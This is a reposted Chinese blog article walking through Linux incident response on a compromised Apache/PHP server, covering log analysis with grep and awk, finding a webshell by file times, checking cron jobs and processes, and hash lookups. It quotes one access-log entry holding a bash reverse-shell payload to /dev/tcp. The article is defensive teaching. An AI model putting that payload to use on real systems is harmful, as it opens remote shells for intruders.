<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/c9G-njsyCWK33ydTg26lPg)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

来源：先知社区，作者：1096997518662234

原文：https://xz.aliyun.com/t/14596

现在只对常读和星标的公众号才展示大图推送，建议大家把潇湘信安 “设为星标”，否则可能看不到了！

**前言**

此次 Linux 应急响应文章主要给大家分享一下具体流程和步骤，以及实际操作起来的流程和踩过的坑，可能大家知道这么操作但是习惯性的遗忘。思路需要，但是思路有，实际操作却跟不上，思路这不亚于纸上谈兵。

如果文章有说的不对或者不够完整的希望大家补充。

**目标信息情况**

当我们去甲方客户现场做应急响应时，啥也没有，首先要了解目标主机网站部署结构，比如说中间件是否是 apache，语言是否是 PHP，网站性质是否是 CMS 还是 OA 等，在这基础上再进行下一步的操作。

通过询问客户人员信息或者根据自行判定，比如说使用 netstat -anultp 查看服务信息，发现 apache，说明这是一个 apache 的服务器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSr8ibpqT7of8jPLGnPYx1Z0p1pE8tibgO9JOhRIjp8h2OlbKadxK8za4Q/640?wx_fmt=png&from=appmsg)

通过上述我们确定了 apache 的服务我们可以知道一般 apache 日志都是再 / var/log 下面，我们也可以使用 ps -aux |grep -i apache 查看是否是 apache 并且该服务用户发现是 www-data

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSsqQvysXkxGfPq9ywUMlXnXp5o9K6YYuZaC9olS9nzQVeGReKEBJzCQ/640?wx_fmt=png&from=appmsg)

**日志确定**

所以我们可以直接去寻找 apache 的日志，/var/log 下，可能 apache 日志再改路径下也可能在下一级路径 / var/log/apache2 / 下面，这个就可以根据平时自己的经验判断，总而言之反正在 / var/log 下就对了，大家一定要注意，输入命令 ls 时一定要把 - a 参数敲上，显示所有文件，因为有的文件隐藏了说不定就因为粗心没有带上 - a 参数导致漏洞文件信息等  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSmwof4TIObwGHMaCn9L9QWZHDlZVXCqlmPDraotPibM5KHKcjhKoplkA/640?wx_fmt=png&from=appmsg)

  

我们也可以通过 ls -alt 参数根据时间顺序列出该目录下的所有文件，这个也是很有必要的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSxbJjshCLcgcHO0qwVSpxWb5BZfutDMQibF6aZX6XpxRYs16c1ciaOvoA/640?wx_fmt=png&from=appmsg)

  

**日志分析**

通过上述图片也可以发现业务量特别大，我们使用 cat access.log.1 | wc -l 发现存在 9272 条  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmS4quhA9ibGPicVicpUUwfU3EOUlPjZFW7d8RFqycBofbIZcicPibBk4OC9XQ/640?wx_fmt=png&from=appmsg)

当我们通过上图的一系列命令进行定位和日志判断以及文件数据内容大小判断发现非常大，如果我们一个一个查那太费时间了，所以我们可以使用 grep 加 | 的方式进行简化日志，但是在这其中你可能会发现 grep 只能发现一些数据，就不能回显所有正则匹配的方式，我大概猜测是字节流的原因，这个没有仔细去深究过，所以我们需要使用如下命令，如果你实在没有办法你也可以把文件导入到 notepad++ 或者 visual code 里面 Ctrl+f 来查找，反正这个思路很多的。

```
cat -e access.log.1 | grep 1.php
cat access.log.1 | grep -a 1.php

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSYibYaXH0iaIjmOuy6kX5jaGaF33n5GSWxrTSbQe0UgvMh17SbN243v9w/640?wx_fmt=png&from=appmsg)

```
192.168.1.7 - - [24/Apr/2022:15:27:32 +0000] "GET /data/avatar/1.php?2022=bash%20-i%20%3E&%20/dev/tcp/192.168.1.7/1234%200%3E&1 HTTP/1.1" 200 242 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"$

```

通过上述一条日志我们可以知道格式为：

```
访问者ip 时间 请求头 请求路径 URL http版本 状态码  长度
user-agent头

```

通过上述文件我们可以使用 awk 命令进行正则匹配来过滤出我们想要的数据，比如说我们需要知道访问者 ip，那么我们可以使用如下命令进行筛选

```
awk '{print $1}' access.log.1   此命令为匹配字段为1的数据并只显示字段为1的数据

```

通过上述命令我们筛选出所有的 IP

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSsOyleEWDMglU4SFvMos4kyibyrDdZJEw4icpYEX5CRicml23T9D52cUdQ/640?wx_fmt=png&from=appmsg)

我们还可以使用如下命令对所有 IP 请求次数进行行数展示并且进行 sort 排序

```
awk '{print $1}' access.log.1 | sort | uniq -c
uniq是行数展示
sort默认进行ASCII排序

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSlCfh2jdosZhbsvXu282vRD2Ot9AyYhEOykdeZD0ibb6Qv4VlfrBJZ7A/640?wx_fmt=png&from=appmsg)

通过上述 IP 发现 192.168.1.7 访问量非常大，所以很可能是异常 IP。

我们可以使用如下命令来查看日志时间记录跨度和间隔时间

```
head -n 1 access.log.1 | tail -2 access.log.1

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSGnibTZcJibQpRzlshic51gaWxlL26P01sVtHkgSkkzRHkvXjVOGUIlvGw/640?wx_fmt=png&from=appmsg)

使用如下命令可以把 192.168.1.7 的日志全部筛掉

```
awk '{print $1}' access.log.1 | grep -v 192.168.1.7
grep -v 反选目标

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSCJGpxgzZ5qtAJEPtQoT5qMgBHHrPcZY1ia3oiaeWPvfzwGFsj69CJe5g/640?wx_fmt=png&from=appmsg)

我们使用如下命令即可把选取我们所需要的字段打印在页面

```
awk '{print $1 $4 $7}' access.log.1 | grep -v 192.168.1.7

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSaHoibj1QudmHEyQyO5w21HSyo8Ig2g9zpWRAlsXH5GStMibibE1LNLJHw/640?wx_fmt=png&from=appmsg)

我们再使用 wc 命令来查看还剩下多少 IP

```
awk '{print $1 $4 $7}' access.log.1 | grep -v 192.168.1.7 | wc -l

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSjocUTYENicicyl6G9YcSgW2wCQkGib1pnRuN0lL5owzhxb5hIBHTxQbAQ/640?wx_fmt=png&from=appmsg)

通过上述方法我们就可以对不要的日志或者重要的日志进行简化处理，这样我们在进行下一步处理的时候会方便许多。

比如说我们使用用下条命令查看 / user，然后我们获取到了具体的 IP 和时间路径等信息，通过该信息再去比如说企业上面的设备告警信息进行相应的匹配我们就可以相对容易的查找到我们想要的信息

```
awk '{print $1 $4 $7}' access.log.1 | grep -i 192.168.1.5 | grep "/user"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSaQfDNeAR7ia2JOKAT1WbjyDBLXnBozl8SMRatMXuxRsDXvXgerKFksw/640?wx_fmt=png&from=appmsg)

**时间特征分析**

我们通过上述情况我们就可以针对时间去查看在这段时间内文件上传的情况，比如说我们查看日志时间是在 24 小时内，那么我们就可以使用如下命令来查找该时间段的 php 文件（这个我才创建的，只是为了让大家看到效果）  

```
find /var/www/html/ -mtime 0 -name "*.php"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmS788LibWMxbeZ33q6Mia2fEN6x1CRlObic4uRYGd5d9caXEuw1MNrb6bicQ/640?wx_fmt=png&from=appmsg)

我们通过 stat 来判断文件时间信息，当我们再用 echo 进行重新写入的时候发现文件时间更改了，这里是要注意的点，因为我们有时候需要保证文件时间信息，当你查看文件或者误操作导致文件时间进行了修改那么可能对于对文件判断会有一些操作花费更多的时间，所以这里需要注意。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmS9jtv9MVfE6KSHy3Djp0mSxcP1EGPebSLxy7etSicUPoA8ia9nhicmOg0g/640?wx_fmt=png&from=appmsg)

这里可能又会一些细节，比如说我们对文件进行正则匹配的时候可能攻击者并不是 php 后缀，而是 php3,php5,phtml 后缀，我们这时候可以进行前后通配符来正则匹配

```
find /var/www/html/ -mtime 0 -name "*.ph*"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSpu4LqNHcSQicedQT1Iqf1NAIbGmwTOU7c5S0nic7owx9WhgtniboMb7cg/640?wx_fmt=png&from=appmsg)

但是上述这种情况我们是通过时间特征，并且时间跨度不长，如果我们这个 php 文件发现是在三五天过后那么我们再使用该命令可能效果不显著，因为你再这几天内文件变更情况很多，可能列出许多的其他非木马的 php 文件。

基于时间特征还可以进行目录的查看我们通过 ls -alt 发现目录时间变更最近的 data 目录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSjbFyHmcnaUkGZHKBA1NpNvAeicGPPWvWkqQOqib3OnBgCo5mLlR7icNIw/640?wx_fmt=png&from=appmsg)

我们使用 cd 切换进 data 目录发现又两个文件变更时间是最靠前的，一个是 sessions 和 avatar，sessions 猜测是因为登录行为导致文件一直变更，avatar 文件我们不清楚可以 cd 进去进行查看发现存在 1.php 文件并且文件变更时间是最近的我们 cat 一下发现确实是一句话木马文件，我们如果害怕对文件内容不小心做出修改我们也可以使用如下命令进行文件备份操作, 使用 chattr 进行文件锁死，防止文件传播复制。

```
cp 1.php 1.php.bak
chattr -i 1.php.bak

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmS6r9TGjCZicjOVKIicrjEvvBnRMaaU1Fapr4jUF1iaMibqP0rQUJUrftqPg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmScCnqXKyoDTlQoic6EGHjvbXY3KBS5upL0QSDP7hLwI11SAuhqN9CyLQ/640?wx_fmt=png&from=appmsg)

**工具查杀**

看到 webshell 文件时我们需要和客户说我们需要进行查杀可能需要进行 webshell 查杀工具上传至服务器，这一步一定要和客户说，不能私自上传工具。

webshell 后门使用河马查杀  

```
./hm scan /var/www/html/
cat result.csv

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSrtX4SCWbgXiaTPOMY0HTP2oyv77WY8hz1zlRlniatmK53YPhV6ToKt2A/640?wx_fmt=png&from=appmsg)

**定时任务**

我们查看定时任务发现存在一个隐藏目录，像一般存在隐藏目录的基本上都会存在问题，所以大家对于 ls -alt 命令一定要牢记于心不要省略。

**注意：**有时候定时任务做了隐藏我们可以使用 - e 参数进入日志文件查看，这样即使隐藏任务也能发现  

```
crontab -l
crontab -e

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSZy5NFoUgWPTKJpWyfrKc9f8N688hM2L2bOBD8F5qnBZ0oP7oWQ3kvA/640?wx_fmt=png&from=appmsg)

进入定时任务文件查看隐藏任务计划

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSqDQDe5zS4VewibT063sYVBwWa3JaG2H80LjjNtjKtvEZFotDJphfm1g/640?wx_fmt=png&from=appmsg)

隐藏文件. mal 查看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSJfEhtNZqvV5E384koO6DHPLxnNvCYWs0eHpGJFOoiabVFTgDQR6Al0A/640?wx_fmt=png&from=appmsg)

**进程**

当定时任务里面没有恶意文件或者没有定时任务我们可以使用 ps 进行查看，绝大部分的执行文件运维管理员一般都不会直接./ 直接执行，很少有 bash 人员直接使用 bash 执行。  

```
ps -aux | grep  "\./"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSfkic2AMcdkzu2Pq9NpmYcwQhib8Wrx27FOYTtibdYaibqC5UwZOZ7pfE9Q/640?wx_fmt=png&from=appmsg)

**hash 文件检测**

当我们无法获取到文件信息，可能是二进制，我们通过 Linux 下载到本机可能客户不允许，这种情况我们可以使用 sha256num 进行 hash 值获取，然后使用在线威胁平台进行 hash 样本分析。也可以使用浏览器去网上搜索该文件名，还可以使用 Info 来查看文件信息，发现存在后门 shell

```
sha256sum prism
prism Info

```

使用 sha256sum get 执行文件 hash 值

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSGz499OZAMFsicTMxlRLYI2KLF4jPqQVVZ17Z0erRyNDqYibV0qFmqib5A/640?wx_fmt=png&from=appmsg)

使用 virscan 进行 hash 分析

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmS22OB6vUiaFvYXJQ29BSE3qjySFibQmMVkibpL13YxaCspicxSFF1LRMbxA/640?wx_fmt=png&from=appmsg)

使用微步在线云沙箱进行分析

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSkOFYAtP3icQQLlh72Lxwm9Y9z87s76QEPcfOWTbE2ib2rASmRPRfggKw/640?wx_fmt=png&from=appmsg)

使用 Inf0 命令查看文件恶意形式

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSKDn3Q8CJxzglga07eCibH4LaX4AjNZHc1NSjYTTsCseQicGibFZSMXibyQ/640?wx_fmt=png&from=appmsg)

浏览器搜索后门是否存在

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeXKV5v0nOpqs83iaaP1SlmSbMiaYOMhibFr9wY40IkibV67x17JXDmm57AehGTgll7wB8Sfqm1ltEVag/640?wx_fmt=png&from=appmsg)

**总结**

我们通过上述的一部分应急响应操作可以让大家对实际流程有一个大概，但是其中还有许多的操作，比如二进制或者可执行文件 elf,so,out 文件，还有 rpm 包投毒检查，内核检查，自启动项等。

大家可以参考一下，如果有时间也可以具体实践一下，因为思路跟上了可能命令等不熟悉等等情况存在。  

**关注我们**

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 还在等什么？赶紧点击下方名片开始学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**知 识 星 球**

  

  

仅前 1-400 名: 99¥，400-600 名: 128¥，600-800 名: 148¥，800-1000 + 名: 168¥

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOcKGNyJ8jSPNpMahribWIY2cut8eAiakTpr6lAzlLt1xubcuUg4la0LMHmhnENia4icnjOwTsfDqq4I7A/640?wx_fmt=png&from=appmsg)

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe2nibXhkXA8A79MhARiaW5Q0H2aiaR0OwyR63JAI1pRGAc7FZMgIHb9kicboQziaJkTbnlAgOvkdiaHf5g/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247499188&idx=1&sn=9ce15a0e66b2595285e544aaa0c49c24&chksm=cfa559a7f8d2d0b162f00e0c1b02c85219f2668c282b32967b2530f15051b47b21ee2855a783&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe2nibXhkXA8A79MhARiaW5Q0ibIORUp7SmHhzy2uyXKsgn7YwfdjIpZDFx0vT7AJDMtqKf9l5WCzIIQ/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247496043&idx=1&sn=4daa27ade9915de6021fea1c2a21d7bc&chksm=cfa55578f8d2dc6ef887ce27215f942ec233320fa6878bc1666ce0fecb0e7f6c7f96a3ba4e2b&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdAPjIVeN2ZahG9ibP0Y3wlfg6BO1WO7MZfo1JeW7zDWcLSTQ5Ek8zXAia5w1nMnogpbpXP6OxXXOicA/640?wx_fmt=png)